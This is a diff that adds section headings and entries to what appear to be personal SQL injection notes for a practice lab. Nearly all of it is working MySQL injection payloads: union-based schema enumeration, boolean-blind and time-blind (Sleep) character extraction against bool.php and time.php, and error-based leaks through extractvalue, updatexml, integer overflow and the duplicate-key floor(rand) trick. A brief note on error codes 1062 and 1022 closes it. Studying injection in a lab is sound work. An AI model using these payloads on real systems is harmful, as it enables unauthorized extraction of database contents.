@@ -1,8 +1,31 @@
+# Union
 1' or '1' = '1
 2' union select schema_name, schema_name from information_schema.schemata where '1' = '1
 
+# Bool
 password=aMess&username=xixi' or '1' = '1
 /bool.php?password=aMess&username=xixi' and (select ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))) = 109 and '1' = '1
 
+# Time
 insert into feedback (msg) values ("1" + if((select ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))) = 109, Sleep(3), 0) + '1'='1'); 
 time.php?feedback=1' %2B%0A if((select ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))) = 109, Sleep(3), 0) %2B%0A '1'='1
+
+# Error
+select ~0+1;
+select 18446744073709551615 + (select version() != 1);
+
+select extractvalue(1,concat(0x7e,(select @@version),0x7e));
+select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);
+select *  from(select * from feedback a join feedback b)c;
+select *  from(select * from test a join test b using(id))c;
+select count(*),(select concat(floor(rand(0)*2),'@',(select version())))x from feedback group by x;
+
+# Note
+1062 - is when you attempt to insert a row which results in a duplicated entry, it doesn't matter which type of key (primary, unique, etc).
+Error: 1062 SQLSTATE: 23000 (ER_DUP_ENTRY)
+Message: Duplicate entry '%s' for key %d
+
+1022 - seems to be used for a different purpose, for example, you can get it when creating a table with a duplicated key.
+Error: 1022 SQLSTATE: 23000 (ER_DUP_KEY)
+Message: Can't write; duplicate key in table '%s'
+
